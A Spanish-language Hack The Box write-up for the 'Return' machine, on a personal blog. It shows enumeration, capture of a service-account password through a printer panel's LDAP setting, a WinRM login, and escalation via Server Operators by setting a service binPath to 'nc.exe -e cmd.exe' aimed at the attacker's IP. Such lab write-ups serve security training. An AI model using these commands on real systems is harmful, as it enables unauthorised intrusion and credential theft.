@@ -1,0 +1,792 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Return HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Return de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Return HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Return/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Return de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Return/return_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-07T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Return/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Return HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Return HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Return de Hack The Box">
+    <meta itemprop="datePublished" content="February 07, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Return HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-07T00:00:00-05:00">February 07, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Return/Return_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Return</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema.</li>
+  <li>Vulnerar web de impresora.</li>
+  <li>Utilización de burpsuite.</li>
+  <li>Abuso de grupo Server Operators para escalar privilegios.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.108
+PING 10.10.11.108 (10.10.11.108) 56(84) bytes of data.
+64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=136 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.108 -oG ports
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49674/tcp open  unknown
+49675/tcp open  unknown
+49679/tcp open  unknown
+49682/tcp open  unknown
+49694/tcp open  unknown
+60360/tcp open  unknown¡
+</code></pre></div></div>
+<p>Los puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49694 10.10.11.108 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: HTB Printer Admin Panel
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-09 05:27:00Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+|_clock-skew: 18m35s
+| smb2-time: 
+|   date: 2023-02-09T05:28:01
+|_  start_date: N/A
+</code></pre></div></div>
+
+<p>Efectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto <code class="language-plaintext highlighter-rouge">445</code> abierto, el cual corresponde al servicio <code class="language-plaintext highlighter-rouge">smb</code>, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.108
+
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<p>Se puede observar que el dominio es <strong>return.local</strong>, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.11.108    return.local
+</code></pre></div></div>
+<p>Para de esta manera tener conectividad, para comprobarlo utilizamos <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 return.local
+
+PING return.local (10.10.11.108) 56(84) bytes of data.
+64 bytes from return.local (10.10.11.108): icmp_seq=1 ttl=127 time=134 ms
+</code></pre></div></div>
+
+<p>Luego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, con la herramienta <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.108 --shares
+
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+</code></pre></div></div>
+
+<p>Sin embargo, no fue posible. Para seguir la enumeración utilizamos <code class="language-plaintext highlighter-rouge">smbmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 10.10.11.108
+
+[+] IP: 10.10.11.108:445        Name: return.local  
+</code></pre></div></div>
+<p>No tenemos capacidad de lectura de ningún recurso, por lo que no podemos seguir enumerando por smb.</p>
+
+<p>Revisando los puertos vemos que está el <strong>80</strong> abierto, por lo tanto, vamos a utilizar la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> para ver qué información nos ofrece:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.108
+http://10.10.11.108 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.108], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
+</code></pre></div></div>
+<p>Como podemos observar, corresponde a un IIS. Vamos al navegador para ver de qué se trata:</p>
+
+<p><img src="/imagenes/Return/return.png" alt="" /></p>
+
+<p>Vemos una impresora, al parecer corresponde a la página de una impresora. Si recorremos vemos la sección <strong>settings</strong>:</p>
+
+<p><img src="/imagenes/Return/return2.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Podemos observar que existe un panel, en el cual se puede poner información. Además, existe una sección de contraseña, si vamos a inspeccionar elemento podremos ver que corresponde a <strong>text</strong>, por lo tanto, no es una contraseña sino asteríscos.</p>
+
+<p>En este punto utilizaremos <code class="language-plaintext highlighter-rouge">burpsuite</code> para interceptar la petición:</p>
+
+<p><img src="/imagenes/Return/return3.png" alt="" /></p>
+
+<p>Obsevarmos que la única información que se envía por <strong>POST</strong> es la del servidor, por lo tanto, debe estar intentando conectarse a esa <strong>IP</strong>. Para comprobar si esto de verdad ocurre o es simplemente una página inútil vamos a ingresar nuestra ip, además estaremos escuchando por el puerto <strong>389</strong> como dice en la página:</p>
+
+<p><img src="/imagenes/Return/return4.png" alt="" /></p>
+
+<p>Al momento de enviar la petición podemos ver que nos llega una conexión en <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 389
+listening on [any] 389 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 62090
+0*`%return\svc-printer�
+                       1edFg43012!!
+</code></pre></div></div>
+<p>Obtenemos unos números extraños, puede ser que sean una contraseña. Para verificar si esto es correcto utilizaremos <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+
+SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
+SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
+</code></pre></div></div>
+
+<p>Bien, corresponde a un usuario válido. Como está el puerto de winrm abierto intentaremos ver si este usuario pertenece al grupo <strong>Remote Management use</strong> utilizando <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+
+SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
+HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
+WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
+</code></pre></div></div>
+
+<p>Observamos que si está en el grupo, por lo tanto, utilizando <code class="language-plaintext highlighter-rouge">evil-winrm</code> nos conectaremos a la máquina:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; whoami
+return\svc-printer
+</code></pre></div></div>
+
+<p>Ahora buscaremos la flag dentro del directorio personal del usuairo <code class="language-plaintext highlighter-rouge">svc-printer</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; dir
+
+
+    Directory: C:\Users\svc-printer\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         2/8/2023   8:29 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; type user.txt
+a91d927f0709257aa634d1
+</code></pre></div></div>
+
+<p>Bien, ahora tenemos que encontrar la forma de convertirnos en domain admin.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Si observamos los grupos del usuario tenemos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; net user svc-printer
+User name                    svc-printer
+Full Name                    SVCPrinter
+Comment                      Service Account for Printer
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/26/2021 12:15:13 AM
+Password expires             Never
+Password changeable          5/27/2021 12:15:13 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/8/2023 8:52:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Print Operators      *Remote Management Use
+                             *Server Operators
+Global Group memberships     *Domain Users
+The command completed successfully.
+</code></pre></div></div>
+
+<p>Observamos que pertenecemos al grupo <strong>Server Operators</strong>, si buscamos por google si existen maneras de escalar privilegios con este grupo encontramos la siguiente <a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">web</a>, el primer paso consiste en subir a la máquina víctima el <code class="language-plaintext highlighter-rouge">netcat.exe</code>, en este caso este ejecutable en encuentra en:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate nc.exe
+
+/home/kali/SecLists/Web-Shells/FuzzDB/nc.exe
+/usr/share/windows-resources/binaries/nc.exe
+</code></pre></div></div>
+
+<p>Prodecemos a subirlo a máquina víctima:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\svc-printer&gt; upload /usr/share/windows-resources/binaries/nc.exe
+Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\nc.exe
+
+                                                             
+Data: 79188 bytes of 79188 bytes copied
+
+Info: Upload successful!
+</code></pre></div></div>
+
+<p>La gracia que tiene todo esto, es que al ser del grupo <strong>Server Operators</strong> podemos ejecutar y detener servicios, lo que podemos hacer es cambiar el <strong>path</strong> de un servicio en particular para ejectuar lo que nosotros queramos, en este caso será una conexión por <code class="language-plaintext highlighter-rouge">netcat</code> hacia nuestra máquina, estaremos utilizando el servicio <code class="language-plaintext highlighter-rouge">VMTools</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\svc-printer&gt; services
+
+Path                                                                                                                 Privileges Service          
+----                                                                                                                 ---------- -------          
+C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
+\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
+C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
+"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
+C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
+"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
+"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc 
+</code></pre></div></div>
+
+<p>Ahora, teniendo en <code class="language-plaintext highlighter-rouge">nc.exe</code> en la máquina, cambiamos el <strong>path</strong> del servicio:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc-printer&gt; sc.exe config VMTools binPath="C:\Users\svc-printer\nc.exe -e cmd.exe 10.10.14.17 1234"
+[SC] ChangeServiceConfig SUCCESS
+</code></pre></div></div>
+
+<p>Luego, detenemos el servicio de <strong>VMTools</strong> y lo volvemos a iniciar para que busque el servicio desde el nuevo path y ejecute el <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc-printer&gt; sc.exe stop VMTools
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\svc-printer&gt; sc.exe start VMTools
+</code></pre></div></div>
+
+<p>En nuestra máquina recibimos una conexión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 65188
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre></div></div>
+
+<p>Podemos notar que somos administrador, ahora buscamos la flag en el directorio personal del administrador:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+c1e9b456ee2a4891a570be
+</code></pre></div></div>
+
+<p>¡Bien!</p>
+
+<p>Hemos ganado acceso como administrador.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#burpsuite" class="page__taxonomy-item" rel="tag">Burpsuite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#printer" class="page__taxonomy-item" rel="tag">Printer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#server-operators-abuse" class="page__taxonomy-item" rel="tag">Server Operators abuse</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-07T00:00:00-05:00">February 07, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Sauna/" class="pagination--pager" title="Sauna HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Timelapse/" class="pagination--pager" title="Timelapse HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
